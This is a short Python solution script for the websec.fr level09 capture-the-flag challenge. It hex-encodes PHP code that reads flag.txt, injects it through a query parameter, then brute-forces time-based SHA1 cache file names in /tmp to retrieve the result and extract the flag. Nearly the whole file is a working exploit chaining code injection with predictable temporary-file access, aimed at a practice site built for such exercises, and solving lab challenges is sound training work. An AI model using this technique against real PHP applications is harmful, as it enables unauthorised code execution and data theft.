import time
import hashlib
import requests
import re

# Get current time and calculate SHA1 hash
current_time = int(time.time())
sha1_hash = hashlib.sha1(str(current_time).encode()).hexdigest()
print(f"SHA1(time()): {sha1_hash}")

# First GET request (change 'c' as needed)
def hexdump(txt):
    return ''.join([f'\\\\x{ord(c):02x}' for c in txt])

code = "echo file_get_contents('flag.txt');"
payload = hexdump(code)

source_url = f"https://websec.fr/level09/source.php?submit&c={requests.utils.quote(payload)}"
resp1 = requests.get(source_url)
print(f"Source response status: {resp1.status_code}")

# Try a span of times (±3 seconds)
for t in range(current_time - 3, current_time + 4):
    hash_try = hashlib.sha1(str(t).encode()).hexdigest()
    cache_url = f"https://websec.fr/level09/index.php?cache_file=/tmp/{hash_try}"
    resp2 = requests.get(cache_url)
    print(f"Trying {cache_url} - Status: {resp2.status_code}")
    if resp2.status_code == 200 and resp2.text.strip():
        # print("Possible cache file found!")
        print(resp2.headers)
        if len(resp2.content) != 1167:
            print("Cache file length does not match expected size.")
            # print(resp2.text)
            if "WEBSEC" in resp2.text:
                print("Flag found in response:")
                print(re.search(r'WEBSEC\{.*?\}', resp2.text).group(0))
            break